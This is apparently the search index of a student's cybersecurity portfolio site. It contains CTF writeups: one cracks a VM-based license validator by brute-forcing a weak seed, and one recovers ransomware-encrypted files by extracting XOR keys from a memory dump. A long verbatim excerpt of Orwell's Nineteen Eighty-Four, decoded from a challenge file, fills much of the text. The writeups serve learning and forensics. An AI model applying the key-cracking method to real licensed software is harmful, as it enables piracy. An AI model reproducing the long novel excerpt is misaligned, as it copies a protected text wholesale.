{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":""},{"location":"#portfolio-security-notes","title":"Portfolio &amp; Security Notes","text":"<p>Welcome to my personal knowledge base and portfolio.</p> <p>This site contains my hands-on writeups, technical notes, and experiments in cybersecurity, infrastructure, and systems engineering.</p>"},{"location":"#what-youll-find-here","title":"\ud83d\udcc2 What You'll Find Here","text":"<ul> <li> <p>\ud83c\udff4\u200d\u2620\ufe0f CTF Writeups   Detailed writeups covering forensics, cryptography, reverse engineering, and web challenges.</p> </li> <li> <p>\ud83e\uddea Lab &amp; Architecture Simulations   Notes and experiments related to system behavior, infrastructure design, and security tooling.</p> </li> <li> <p>\u2601\ufe0f Infrastructure &amp; Systems Notes   Linux internals, networking concepts, containers, Kubernetes, and deployment workflows.</p> </li> <li> <p>\ud83d\udd10 Security Engineering &amp; Detection   Configuration notes, log analysis, and observations relevant to defensive security and threat detection.</p> </li> </ul> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"about/","title":"About","text":""},{"location":"about/#cybersecurity-ctf-writeups-infrastructure-systems","title":"Cybersecurity \u2022 CTF Writeups \u2022 Infrastructure &amp; Systems","text":"<p>I am an student also engineer with a strong interest in cybersecurity, cloud, system, especially CTF challenges, digital forensics, system architecture, and system-level analysis.</p> <p>This site serves as my personal knowledge base and portfolio, where I document what I learn, build, analyze, and break through hands-on technical exploration.</p> <p>I believe in learning by:</p> <ul> <li>analyzing real-world-like problems</li> <li>understanding systems from the inside</li> <li>documenting knowledge clearly for future reference</li> </ul> <p>Every writeup here reflects my learning process, including mistakes, debugging, and reasoning, not just final answers.</p> <p>This site is continuously updated as I learn and explore new topics.</p> <ul> <li>GitHub: https://github.com/dhicosatria</li> </ul> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"test/","title":"Test","text":"2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"blog/","title":"Blog","text":""},{"location":"blog/#blog","title":"Blog","text":"2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/","title":"Overview","text":""},{"location":"ctf/#ctf-writeups","title":"CTF Writeups","text":"<p>This section contains a collection of Capture The Flag (CTF) writeups that I have documented. Each writeup focuses on analysis, tools used, step-by-step solving process, and lessons learned.</p> <p>The goal of this documentation is not only to present the final result, but also to explain the reasoning and methodology behind each solution.</p>"},{"location":"ctf/#available-ctfs","title":"Available CTFs","text":"<ul> <li>Advent of Cyber 2025 \u2013 CyberStudent</li> </ul> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/","title":"Overview","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/#advent-of-cyber-2025-cyberstudent","title":"Advent of Cyber 2025 \u2013 CyberStudent","text":"<p>This page contains a series of writeups from Advent of Cyber 2025 (CyberStudent) challenges. Each challenge is documented with a structured approach, including analysis, commands executed, key findings, and final results.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/#challenge-list","title":"Challenge List","text":"<ul> <li>The Mission Begins</li> <li>The First Strike</li> <li>Syndicate Infrastructure</li> <li>The Elf's Wager</li> <li>Kramazon</li> <li>KDNU-3B</li> <li>Failed exfil</li> <li>Log Folly</li> <li>Time to Escalate</li> <li>Jingle's Validator</li> <li>Syndiware</li> <li>Re-Key-Very</li> <li>Holiday Routing</li> <li>Multifactorial</li> <li>Guide My Drone Tonight</li> </ul> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/","title":"Jingle's Validator","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#day-10-jingles-validator","title":"day 10 Jingle's Validator","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#description","title":"Description","text":"<p>The North Pole Licensing Division needed offline activation for internal tools. Jingle McSnark volunteered to build the validator.</p> <p>Three weeks later, he emailed the entire department. Called it \"military-grade.\" Refused code review. Attached the binary and said it was uncrackable.</p> <p>Snowdrift replied-all: \"Let me know when you want a second opinion.\"</p> <p>Jingle hasn't responded. Attached is an internal test build. Prove him wrong... again.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#attachments","title":"Attachments","text":"<p>jollyvm</p> <p>jollyvm</p> <p>hint :</p> <ul> <li>You may have noticed the program is emulating some instructions, like a virtual machine. Some of these instructions may be specialized for the program.</li> <li>Once you've figured out the instructions, analyze the higher level program. How much of the state actually changes before your input is encrypted?</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#initial-reconnaissance","title":"Initial Reconnaissance","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#file-inspection","title":"File Inspection","text":"<pre><code>file jollyvm\n</code></pre> <p>Output:</p> <pre><code>ELF64-bit LSB executable, x86-64, dynamically linked\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#execution-test","title":"Execution Test","text":"<pre><code>./jollyvm\n</code></pre> <p>Output:</p> <pre><code>Enter licensekey:\n</code></pre> <p>Random input:</p> <pre><code>Invalid license.\n</code></pre> <p>The program performs local input validation without network interaction.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#input-length-check","title":"Input Length Check","text":"<p>Static analysis in Ghidra reveals:</p> <pre><code>read(0, buf,0x34);\n</code></pre> <p>License key length:</p> <pre><code>0x34hex =52bytes\n</code></pre> <p>Any input not exactly 52 characters fails.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#virtual-machine-discovery","title":"Virtual Machine Discovery","text":"<p>While analyzing <code>main()</code>, we observe:</p> <ul> <li>No direct string comparison</li> <li>Heavy use of registers</li> <li>Large byte array in <code>.rodata</code></li> <li>Instruction dispatch logic</li> </ul> <p>The program implements a custom virtual machine (VM).</p> <p>This matches the challenge hint:</p> <p>\u201cThe program is emulating some instructions, like a virtual machine.\u201d </p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#vm-high-level-logic","title":"VM High-Level Logic","text":"<p>The VM:</p> <ol> <li>Takes user input (52 bytes)</li> <li>Splits it into 13 blocks of 4 bytes</li> <li>Encrypts each block</li> <li>Compares result with a constant table in <code>.rodata</code></li> </ol> <p>If all blocks match \u2192 license valid.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#encryption-algorithm","title":"Encryption Algorithm","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#helper-function-gx","title":"Helper Function <code>g(x)</code>","text":"<pre><code>g(x) = ((x &gt;&gt;3) ^ (x &gt;&gt;5) ^ (x &gt;&gt;8) ^ (x &gt;&gt;12)) &amp;0xff\n</code></pre> <ul> <li>XOR-based</li> <li>Produces 1 byte</li> <li>Cryptographically weak</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#encryption-process-per-block","title":"Encryption Process Per Block","text":"<p>Initial state:</p> <pre><code>state =0xf337;\n</code></pre> <p>For each plaintext block <code>P[i]</code>:</p> <pre><code>T = (state &lt;&lt;8) | g(state)\nC = P[i] XOR T\nstate = (T &lt;&lt;8) | g(P[i])\n</code></pre> <p>Where:</p> <ul> <li><code>P[i]</code> = plaintext block</li> <li><code>C</code> = ciphertext block</li> <li><code>T</code> = keystream</li> </ul> <p>State depends on plaintext , major design flaw.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#critical-weakness-seed-from-last-block","title":"Critical Weakness: Seed from Last Block","text":"<p>Before encryption begins, the state is seeded using the last plaintext block:</p> <pre><code>state = g(P[12]);\n</code></pre> <p>However:</p> <ul> <li><code>g()</code> only depends on 20 lower bits</li> <li>Entropy = <code>2^20 = 1,048,576</code></li> </ul> <p>Bruteforce feasible</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#attack-strategy","title":"Attack Strategy","text":"<p>We know:</p> <pre><code>C[i]=Encrypt(P[i])\n</code></pre> <p>Goal:</p> <pre><code>FindPsuchthatEncrypt(P)==KnownCiphertext\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#steps","title":"Steps:","text":"<ol> <li>Extract ciphertext table from <code>.rodata</code></li> <li>Bruteforce all <code>2^20</code> seed values</li> <li>Decrypt ciphertext using guessed seed</li> <li>Validate:<ul> <li>Last block seed matches</li> <li>All characters printable ASCII</li> </ul> </li> </ol>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_10_Jingle%27s-Validator/#solver-script","title":"Solver Script","text":"<pre><code>defg(x):\nreturn ((x&gt;&gt;3) ^ (x&gt;&gt;5) ^ (x&gt;&gt;8) ^ (x&gt;&gt;12)) &amp;0xff\n</code></pre> <p>Bruteforce logic:</p> <pre><code>for seedinrange(2**20):\n    plaintext = decrypt(seed)\nif is_printable(plaintext):\nprint(plaintext)\nbreak\n</code></pre> <p>Recovered license key:</p> <pre><code>csd{I5_4ny7HiN9_R34LlY_R4Nd0m_1F_it5_bru73F0rc4B1e?}\n</code></pre> <p>Verification:</p> <pre><code>./jollyvm\nEnter license key:\ncsd{I5_4ny7HiN9_R34LlY_R4Nd0m_1F_it5_bru73F0rc4B1e?}\n</code></pre> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_11_Syndiware/","title":"Syndiware","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_11_Syndiware/#day-11-syndiware","title":"day 11 Syndiware","text":"<p>category : forensic</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_11_Syndiware/#description","title":"Description","text":"<p>The Krampus Syndicate has never been subtle, but their newest initiative, codenamed Syndiware, might be their boldest misstep yet. Designed as a \"consumer-friendly malware suite,\" Syndiware appears to target the youngest and most gullible users on the network: interns, seasonal hires, and anyone who believes free virtual currency generators are safe to run.</p> <p>One such recruit learned this the hard way. Minutes after launching a suspicious executable, his entire workstation transformed into a theater of chaos: missing files, corrupted data structures, and a ransom note full of melodramatic threats. The intern claims he only clicked \"Run Anyway\" once. (The security logs suggest otherwise.)</p> <p>What the Syndicate didn't expect is that this early build of Syndiware still has its rough edges and bugs. Somewhere in those remnants lies something important... something the Syndicate didn't intend for anyone to recover.</p> <p>Follow the traces of the intrusion, work out the Syndicate\u2019s techniques, and reveal the concealed Syndiware relic they attempted to hide.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_11_Syndiware/#attachments","title":"Attachments","text":"<p>syndicate_locker.zip</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_11_Syndiware/#understand-how-ransomware-works","title":"Understand How Ransomware Works","text":"<p>Open <code>FreeRobux.py</code>. The gist of it is as follows:</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_11_Syndiware/#encryption-mechanism","title":"Encryption Mechanism","text":"<pre><code>k_size =32\nmarker =b'\\xAA\\xBB\\xCC\\xDD'\n\nk = os.urandom(32)# key per file\nciphertext = plaintext XOR key\n</code></pre> <p>Weakness:</p> <ul> <li>Keys are not saved to disk</li> <li>Keys are stored in memory (VirtualAlloc)</li> <li>Static markers <code>AA BB CC DD</code> are present</li> <li>Memory dump: <code>ransomware.DMP</code> are present</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_11_Syndiware/#data-structure-in-memory","title":"Data Structure in Memory","text":"<p>Each file is stored in memory like this:</p> <pre><code>[ filename (60 bytes) ]\n[ key (32 bytes) ]\n[ marker AA BB CC DD ]\n</code></pre> <p>And repeat for each file.</p> <p>So we just have:</p> <ol> <li>Find marker <code>AA BB CC DD</code></li> <li>Move back 32 bytes \u2192 KEY</li> <li>Move back 60 bytes \u2192 FILENAME</li> </ol>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_11_Syndiware/#extract-key-from-memory-dump","title":"Extract Key from Memory Dump","text":"<p>Run this script in the same folder as <code>ransomware.DMP</code>:</p> <pre><code>import re\n\nMARKER = b\"\\xAA\\xBB\\xCC\\xDD\"\nKEY_SIZE = 32\nFNAME_SIZE = 60\n\nwith open(\"ransomware.DMP\", \"rb\") as f:\n    data = f.read()\n\nhits = [m.start() for m in re.finditer(re.escape(MARKER), data)]\nprint(\"[*] marker hits:\", len(hits))\n\nseen = set()\nfor pos in hits:\n    key = data[pos-KEY_SIZE:pos]\n    fname_raw = data[pos-KEY_SIZE-FNAME_SIZE:pos-KEY_SIZE]\n    fname = fname_raw.split(b\"\\x00\", 1)[0].decode(\"utf-8\", errors=\"ignore\")\n    if fname and (fname.endswith(\".pdf\") or fname.endswith(\".png\")):\n        if (fname, key) not in seen:\n            seen.add((fname, key))\n            print(f\"[+] {fname} -&gt; {key.hex()}\")\n</code></pre> <p></p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_11_Syndiware/#decrypt-file-enc","title":"Decrypt File <code>.enc</code>","text":"<pre><code>def xor(data, key):\n    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))\n\n# ISI key hasil output extract_keys.py (HEX -&gt; bytes.fromhex)\nkeys = {\n  \"Elf 41's Diary.pdf\": bytes.fromhex(\"7eb6ed7aa1e1c0a59163d1551124dac065dd16c90f926e3cae58d3a32fd6e5ca\"),\n  \"Elf67\u2019s Diary.pdf\":  bytes.fromhex(\"3bcdad92edbe7ee092eac7872490f555c667a5d56d7bc4c1f52dc1dbe231c69c\"),\n  \"ourking.png\":        bytes.fromhex(\"0d89c7900e8044b5e0ef1e905b5bea9daf31b5843f92ec7de7accd46e524cf08\"),\n}\n\nfor fname, key in keys.items():\n    enc_name = f\"{fname}.enc\"\n    with open(enc_name, \"rb\") as f:\n        enc = f.read()\n\n    dec = xor(enc, key)\n\n    out_name = \"recovered_\" + fname\n    with open(out_name, \"wb\") as f:\n        f.write(dec)\n\n    print(\"[OK] wrote\", out_name)\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_11_Syndiware/#check-the-recovered-file","title":"Check the recovered file","text":"<pre><code>file recovered_Elf\\ 41\\'s\\ Diary.pdf\nfile recovered_ourking.png\n</code></pre> <p>decode PDF</p> <pre><code>with open(\"decoded.txt\", \"w\") as out:\n    with open(\"numbers.txt\") as f:\n        for token in f.read().split():\n            if set(token) &lt;= {\"6\", \"7\"} and len(token) == 8:\n                binary = token.replace(\"6\", \"0\").replace(\"7\", \"1\")\n                out.write(chr(int(binary, 2)))\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Downloads/cyberstudent/11 des/syndicate_locker]\n\u2514\u2500$ pdftotext recovered_Elf67\u2019s\\ Diary.pdf - &gt;&gt;numbers.txt\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Downloads/cyberstudent/11 des/syndicate_locker]\n\u2514\u2500$ python3  decode.py                                    \n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Downloads/cyberstudent/11 des/syndicate_locker]\n\u2514\u2500$ cat decoded.txt \nIt was a bright cold day in April, and the clocks were striking thirteen. Winston\nSmith, his chin nuzzled into his breast in an effort to escape the vile wind, slipped\nquickly through the glass doors of Victory Mansions, though not quickly enough\nto prevent a swirl of gritty dust from entering along with him.\nThe hallway smelt of boiled cabbage and old rag mats. At one end of it a\ncoloured poster, too large for indoor display, had been tacked to the wall. It\ndepicted simply an enormous face, more than a metre wide: the face of a man of\nabout forty-five, with a heavy black moustache and ruggedly handsome features.\nWinston made for the stairs. It was no use trying the lift. Even at the best\nof times it was seldom working, and at present the electric current was cut off\nduring daylight hours. It was part of the economy drive in preparation for Hate\nWeek. The flat was seven flights up, and Winston, who was thirty-nine and had\na varicose ulcer above his right ankle, went slowly, resting several times on the\nway. On each landing, opposite the lift-shaft, the poster with the enormous face\ngazed from the wall. It was one of those pictures which are so contrived that\nthe eyes follow you about when you move. BIG BROTHER IS WATCHING\nYOU, the caption beneath it ran.\nInside the flat a fruity voice was reading out a list of figures which had\nsomething to do with the production of pig-iron. The voice came from an\noblong metal plaque like a dulled mirror which formed part of the surface of the\nright-hand wall. Winston turned a switch and the voice sank somewhat, though\nthe words were still distinguishable. The instrument (the telescreen, it was\ncalled) could be dimmed, but there was no way of shutting it off completely. He\nmoved over to the window: a smallish, frail figure, the meagreness of his body\nmerely emphasized by the blue overalls which were the uniform of the party.\nHis hair was very fair, his face naturally sanguine, his skin roughened by coarse\nsoap and blunt razor blades and the cold of the winter that had just ended.\nOutside, even through the shut window-pane, the world looked cold. Down\nin the street little eddies of wind were whirling dust and torn paper into spirals,\nand though the sun was shining and the sky a harsh blue, there seemed to be\nno colour in anything, except the posters that were plastered everywhere. The\nblack-moustachio\u00e2d face gazed down from every commanding corner. There was\none on the house-front immediately opposite. BIG BROTHER IS WATCHING\nYOU, the caption said, while the dark eyes looked deep into Winston\u00e2s own.\nDown at streetlevel another poster, torn at one corner, flapped fitfully in the\nwind, alternately covering and uncovering the single word INGSOC. In the far\ndistance a helicopter skimmed down between the roofs, hovered for an instant\n1\nlike a bluebottle, and darted away again with a curving flight. It was the police\npatrol, snooping into people\u00e2s windows. The patrols did not matter, however.\nOnly the Thought Police mattered.\nBehind Winston\u00e2s back the voice from the telescreen was still babbling away\nabout pig-iron and the overfulfilment of the Ninth Three-Year Plan. The telescreen received and transmitted simultaneously. Any sound that Winston made,\nabove the level of a very low whisper, would be picked up by it, moreover, so long\nas he remained within the field of vision which the metal plaque commanded, he\ncould be seen as well as heard. There was of course no way of knowing whether\nyou were being watched at any given moment. How often, or on what system,\nthe Thought Police plugged in on any individual wire was guesswork. It was\neven conceivable that they watched everybody all the time. But at any rate\nthey could plug in your wire whenever they wanted to. You had to live \u00e2 did\nlive, from habit that became instinct \u00e2 in the assumption that every sound you\nmade was overheard, and, except in darkness, every movement scrutinized.\nWinston kept his back turned to the telescreen. It was safer, though, as\nhe well knew, even a back can be revealing. A kilometre away the Ministry of\nTruth, his place of work, towered vast and white above the grimy landscape.\nThis, he thought with a sort of vague distaste \u00e2 this was London, chief city\nof Airstrip One, itself the third most populous of the provinces of Oceania.\nHe tried to squeeze out some childhood memory that should tell him whether\nLondon had always been quite like this. Were there always these vistas of\nrotting nineteenth-century houses, their sides shored up with baulks of timber,\ntheir windows patched with cardboard and their roofs with corrugated iron,\ntheir crazy garden walls sagging in all directions? And the bombed sites where\nthe plaster dust swirled in the air and the willow-herb straggled over the heaps of\nrubble; and the places where the bombs had cleared a larger patch and there had\nsprung up sordid colonies of wooden dwellings like chicken-houses? But it was no\nuse, he could not remember: nothing remained of his childhood except a series\nof bright-lit tableaux occurring against no background and mostly unintelligible.\nThe Ministry of Truth \u00e2 Minitrue, in Newspeak* \u00e2 was startlingly different\nfrom any other object in sight. It was an enormous pyramidal structure of\nglittering white concrete, soaring up, terrace after terrace, 300 metres into the\nair. From where Winston stood it was just possible to read, picked out on its\nwhite face in elegant lettering, the three slogans of the Party:\nWAR IS PEACE\nFREEDOM IS SLAVERY\nIGNORANCE IS STRENGTH\nThe Ministry of Truth contained, it was said, three thousand rooms above\nground level, and corresponding ramifications below. Scattered about London\nthere were just three other buildings of similar appearance and size. So completely did they dwarf the surrounding architecture that from the roof of Victory\nMansions you could see all four of them simultaneously. They were the homes\nof the four Ministries between which the entire apparatus of government was\ndivided. The Ministry of Truth, which concerned itself with news, entertainment, education, and the fine arts. The Ministry of Peace, which concerned\nitself with war. The Ministry of Love, which maintained law and order. And\nthe Ministry of Plenty, which was responsible for economic affairs. Their names,\nin Newspeak: Minitrue, Minipax, Miniluv, and Miniplenty.\nThe Ministry of Love was the really frightening one. There were no windows\n2\nin it at all. Winston had never been inside the Ministry of Love, nor within half\na kilometre of it. It was a place impossible to enter except on official business,\nand then only by penetrating through a maze of barbed-wire entanglements,\nsteel doors, and hidden machine-gun nests. Even the streets leading up to its\nouter barriers were roamed by gorilla-faced guards in black uniforms, armed\nwith jointed truncheons.\nWinston turned round abruptly. He had set his features into the expression\nof quiet optimism which it was advisable to wear when facing the telescreen.\nHe crossed the room into the tiny kitchen. By leaving the Ministry at this time\nof day he had sacrificed his lunch in the canteen, and he was aware that there\nwas no food in the kitchen except a hunk of dark-coloured bread which had got\nto be saved for tomorrow\u00e2s breakfast. He took down from the shelf a bottle\nof colourless liquid with a plain white label marked VICTORY GIN. It gave\noff a sickly, oily smell, as of Chinese rice-spirit. Winston poured out nearly a\nteacupful, nerved himself for a shock, and gulped it down like a dose of medicine.\nInstantly his face turned scarlet and the water ran out of his eyes. The stuff\nwas like nitric acid, and moreover, in swallowing it one had the sensation of being\nhit on the back of the head with a rubber club. The next moment, however,\nthe burning in his belly died down and the world began to look more cheerful.\nHe took a cigarette from a crumpled packet marked VICTORY CIGARETTES\nand incautiously held it upright, whereupon the tobacco fell out on to the floor.\nWith the next he was more successful. He went back to the living-room and sat\ndown at a small table that stood to the left of the telescreen. From the table\ndrawer he took out a penholder, a bottle of ink, and a thick, quarto-sized blank\nbook with a red back and a marbled cover.\nFor some reason the telescreen in the living-room was in an unusual position.\nInstead of being placed, as was normal, in the end wall, where it could command\nthe whole room, it was in the longer wall, opposite the window. To one side\nof it there was a shallow alcove in which Winston was now sitting, and which,\nwhen the flats were built, had probably been intended to hold bookshelves. By\nsitting in the alcove, and keeping well back, Winston was able to remain outside\nthe range of the telescreen, so far as sight went. He could be heard, of course,\nbut so long as he stayed in his present position he could not be seen. It was\npartly the unusual geography of the room that had suggested to him the thing\nthat he was now about to do.\nBut it had also been suggested by the book that he had just taken out of the\ndrawer. It was a peculiarly beautiful book. Its smooth creamy paper, a little\nyellowed by age, was of a kind that had not been manufactured for at least forty\nyears past. He could guess, however, that the book was much older than that.\nHe had seen it lying in the window of a frowsy little junk-shop in a slummy\nquarter of the town (just what quarter he did not now remember) and had been\nstricken immediately by an overwhelming desire to possess it. Party members\nwere supposed not to go into ordinary shops (\u00e2dealing on the free market\u00e2, it was\ncalled), but the rule was not strictly kept, because there were various things,\nsuch as shoelaces and razor blades, which it was impossible to get hold of in any\nother way. He had given a quick glance up and down the street and then had\nslipped inside and bought the book for two dollars fifty. At the time he was not\nconscious of wanting it for any particular purpose. He had carried it guiltily\nhome in his briefcase. Even with nothing written in it, it was a compromising\npossession.\n3\nThe thing that he was about to do was to open a diary. This was not illegal\n(nothing was illegal, since there were no longer any laws), but if detected it was\nreasonably certain that it would be punished by death, or at least by twentyfive years in a forced-labour camp. Winston fitted a nib into the penholder\nand sucked it to get the grease off. The pen was an archaic instrument, seldom\nused even for signatures, and he had procured one, furtively and with some\ndifficulty, simply because of a feeling that the beautiful creamy paper deserved\nto be written on with a real nib instead of being scratched with an ink-pencil.\nActually he was not used to writing by hand. Apart from very short notes, it was\nusual to dictate everything into the speak-write which was of course impossible\nfor his present purpose. He dipped the pen into the ink and then faltered for\njust a second. A tremor had gone through his bowels. To mark the paper was\nthe decisive act. In small clumsy letters he wrote:\nApril 4th, 1984.\nHe sat back. A sense of complete helplessness had descended upon him. To\nbegin with, he did not know with any certainty that this was 1984. It must be\nround about that date, since he was fairly sure that his age was thirty-nine, and\nhe believed that he had been born in 1944 or 1945; but it was never possible\nnowadays to pin down any date within a year or two.\nFor whom, it suddenly occurred to him to wonder, was he writing this diary? For the future, for the unborn. His mind hovered for a moment round\nthe doubtful date on the page, and then fetched up with a bump against the\nNewspeak word doublethink. For the first time the magnitude of what he had\nundertaken came home to him. How could you communicate with the future?\nIt was of its nature impossible. Either the future would resemble the present,\nin which case it would not listen to him: or it would be different from it, and\nhis predicament would be meaningless.\nFor some time he sat gazing stupidly at the paper. The telescreen had\nchanged over to strident military music. It was curious that he seemed not\nmerely to have lost the power of expressing himself, but even to have forgotten\nwhat it was that he had originally intended to say. For weeks past he had been\nmaking ready for this moment, and it had never crossed his mind that anything\nwould be needed except courage. The actual writing would be easy. All he had\nto do was to transfer to paper the interminable restless monologue that had\nbeen running inside his head, literally for years. At this moment, however, even\nthe monologue had dried up. Moreover his varicose ulcer had begun itching\nunbearably. He dared not scratch it, because if he did so it always became\ninflamed. The seconds were ticking by. He was conscious of nothing except the\nblankness of the page in front of him, the itching of the skin above his ankle,\nthe blaring of the music, and a slight booziness caused by the gin.\nSuddenly he began writing in sheer panic, only imperfectly aware of what\nhe was setting down. His small but childish handwriting straggled up and down\nthe page, shedding first its capital letters and finally even its full stops:\nApril 4th, 1984. Last night to the flicks. All war films. One very good\none of a ship full of refugees being bombed somewhere in the Mediterranean.\nAudience much amused by shots of a great huge fat man trying to swim away\nwith a helicopter after him, first you saw him wallowing along in the water like a\nporpoise, then you saw him through the helicopters gunsights, then he was full\nof holes and the sea round him turned pink and he sank as suddenly as though\nthe holes had let in the water, audience shouting with laughter when he sank.\n4\nthen you saw a lifeboat full of children with a helicopter hovering over it. there\nwas a middle-aged woman might have been a jewess sitting up in the bow with\na little boy about three years old in her arms. little boy screaming with fright\nand hiding his head between her breasts as if he was trying to burrow right into\nher and the woman putting her arms round him and comforting him although\nshe was blue with fright herself, all the time covering him up as much as possible\nas if she thought her arms could keep the bullets off him. then the helicopter\nplanted a 20 kilo bomb in among them terrific flash and the boat went all to\nmatchwood. then there was a wonderful shot of a child\u00e2s arm going up up up\nright up into the air a helicopter with a camera in its nose must have followed\nit up and there was a lot of applause from the party seats but a woman down in\nthe prole part of the house suddenly started kicking up a fuss and shouting they\ndidnt oughter of showed it not in front of kids they didnt it aint right not in front\nof kids it aint until the police turned her turned her out i dont suppose anything\nhappened to her nobody cares what the proles say typical prole reaction they\nnever\nWinston stopped writing, partly because he was suffering from cramp. He\ndid not know what had made him pour out this stream of rubbish. But the\ncurious thing was that while he was doing so a totally different memory had\nclarified itself in his mind, to the point where he almost felt equal to writing\nit down. It was, he now realized, because of this other incident that he had\nsuddenly decided to come home and begin the diary today.\nIt had happened that morning at the Ministry, if anything so nebulous could\nbe said to happen.\nIt was nearly eleven hundred, and in the Records Department, where Winston worked, they were dragging the chairs out of the cubicles and grouping\nthem in the centre of the hall opposite the big telescreen, in preparation for\nthe Two Minutes Hate. Winston was just taking his place in one of the middle\nrows when two people whom he knew by sight, but had never spoken to, came\nunexpectedly into the room. One of them was a girl whom he often passed\nin the corridors. He did not know her name, but he knew that she worked in\nthe Fiction Department. Presumably \u00e2 since he had sometimes seen her with\noily hands and carrying a spanner she had some mechanical job on one of the\nnovel-writing machines. She was a bold-looking girl, of about twenty-seven,\nwith thick hair, a freckled face, and swift, athletic movements. A narrow scarlet\nsash, emblem of the Junior Anti-Sex League, was wound several times round\nthe waist of her overalls, just tightly enough to bring out the shapeliness of her\nhips. Winston had disliked her from the very first moment of seeing her. He\nknew the reason. It was because of the atmosphere of hockey-fields and cold\nbaths and community hikes and general clean-mindedness which she managed\nto carry about with her. He disliked nearly all women, and especially the young\nand pretty ones. It was always the women, and above all the young ones, who\nwere the most bigoted adherents of the Party, the swallowers of slogans, the\namateur spies and nosers-out of unorthodoxy. But this particular girl gave him\nthe impression of being more dangerous than most. Once when they passed in\nthe corridor she gave him a quick sidelong glance which seemed to pierce right\ninto him and for a moment had filled him with black terror. The idea had even\ncrossed his mind that she might be an agent of the Thought Police. That, it\nwas true, was very unlikely. Still, he continued to feel a peculiar uneasiness,\nwhich had fear mixed up in it as well as hostility, whenever she was anywhere\n5\nnear him.\nThe other person was a man named O\u00e2Brien, a member of the Inner Party\nand holder of some post so important and remote that Winston had only a\ndim idea of its nature. A momentary hush passed over the group of people\nround the chairs as they saw the black overalls of an Inner Party member approaching. O\u00e2Brien was a large, burly man with a thick neck and a coarse,\nhumorous, brutal face. In spite of his formidable appearance he had a certain\ncharm of manner. He had a trick of resettling his spectacles on his nose which\nwas curiously disarming \u00e2 in some indefinable way, curiously civilized. It was a\ngesture which, if anyone had still thought in such terms, might have recalled an\neighteenth-century nobleman offering his snuffbox. Winston had seen O\u00e2Brien\nperhaps a dozen times in almost as many years. He felt deeply drawn to him,\nand not solely because he was intrigued by the contrast between O\u00e2Brien\u00e2s urbane manner and his prize-fighter\u00e2s physique. Much more it was because of\na secretly held belief \u00e2 or perhaps not even a belief, merely a hope \u00e2 that\nO\u00e2Brien\u00e2s political orthodoxy was not perfect. Something in his face suggested\nit irresistibly. And again, perhaps it was not even unorthodoxy that was written\nin his face, but simply intelligence. But at any rate he had the appearance of\nbeing a person that you could talk to if somehow you could cheat the telescreen\nand get him alone. Winston had never made the smallest effort to verify this\nguess: indeed, there was no way of doing so. At this moment O\u00e2Brien glanced\nat his wrist-watch, saw that it was nearly eleven hundred, and evidently decided\nto stay in the Records Department until the Two Minutes Hate was over. He\ntook a chair in the same row as Winston, a couple of places away. A small,\nsandy-haired woman who worked in the next cubicle to Winston was between\nthem. The girl with dark hair was sitting immediately behind.\nThe next moment a hideous, grinding speech, as of some monstrous machine\nrunning without oil, burst from the big telescreen at the end of the room. It\nwas a noise that set one\u00e2s teeth on edge and bristled the hair at the back of\none\u00e2s neck. The Hate had started.\nAs usual, the face of Emmanuel Goldstein, the Enemy of the People, had\nflashed on to the screen. There were hisses here and there among the audience. The little sandy-haired woman gave a squeak of mingled fear and disgust.\nGoldstein was the renegade and backslider who once, long ago (how long ago,\nnobody quite remembered), had been one of the leading figures of the Party,\nalmost on a level with Big Brother himself, and then had engaged in counterrevolutionary activities, had been condemned to death, and had mysteriously\nescaped and disappeared. The programmes of the Two Minutes Hate 